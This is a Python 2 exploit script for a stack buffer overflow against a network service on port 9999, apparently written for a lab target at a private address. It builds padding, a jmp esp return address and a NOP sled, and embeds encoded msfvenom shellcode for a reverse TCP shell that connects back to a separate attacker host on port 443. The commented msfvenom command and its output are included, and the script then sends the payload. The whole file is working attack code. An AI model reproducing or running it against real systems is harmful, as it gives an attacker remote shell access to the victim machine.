#!/usr/bin/python

import socket
import struct
import time

TARGET = "192.168.92.141"
PORT = 9999

PADDING = "A" * 524
NOP = "\x90" * 64
EIP = struct.pack("I", 0x311712F3) #Location of jmp esp which points to NOPS
				   #struct.pack() converts 0x311712F3 into little-endian format

# msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.92.163 LPORT=443 -f py -b '\x00'
#[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 10 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 150 (iteration=0)
#x86/shikata_ga_nai chosen with final size 150
#Payload size: 150 bytes
#Final size of py file: 730 bytes
buf =  ""
buf += "\xda\xc6\xbd\xe3\xc7\x9b\xe0\xd9\x74\x24\xf4\x5a\x31"
buf += "\xc9\xb1\x1f\x31\x6a\x1a\x83\xc2\x04\x03\x6a\x16\xe2"
buf += "\x16\xad\x91\xbe\xe9\xe9\x51\xdd\x5a\x4d\xcd\x48\x5e"
buf += "\xe1\x97\x05\xbf\xcc\xd8\x81\x64\xa7\x18\x05\xc6\x94"
buf += "\xf1\x54\xf6\xdb\xba\xd0\x17\xb1\xda\xba\x87\x17\x74"
buf += "\xb2\xc6\xdb\xb7\x44\x8d\x1c\x3e\x5c\xc3\xe8\xfc\x36"
buf += "\x79\x10\xff\xc6\x25\x7b\xff\xac\xd0\xf2\x1c\x01\x13"
buf += "\xc9\x63\xe7\x63\xab\xde\x03\x44\xfe\x26\x6d\x8a\xee"
buf += "\x28\x8d\x03\xed\xe8\x66\x1f\x33\x09\x74\xaf\xce\x03"
buf += "\x05\x4a\xf0\xe4\x16\x0f\x78\xf5\x8e\x19\x76\x46\xb3"
buf += "\xa8\x07\x23\x74\x4a\x0a\xd3\x94\x12\x0b\x2b\x57\x62"
buf += "\xb7\x2a\x57\x62\xc7\xe1\xd7"

PAYLOAD = PADDING + EIP + NOP + buf

######################################

try:

	print "[+] Connecting to IP:", TARGET, "at PORT:", PORT
	time.sleep(1)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((TARGET,PORT))

	#Initialize connection
	data = s.recv(1024) 
	print "[+] Connected!"	
	print ""
	print ""
	time.sleep(0.5)
	print data #Debug

	print "[+] Sending the payload ..."
	time.sleep(1)
	s.send(PAYLOAD) #Sends payload
	print "[+] DONE! A reverse shell is on its way :) !"

except:
	print "[-] Error connecting!!!"
 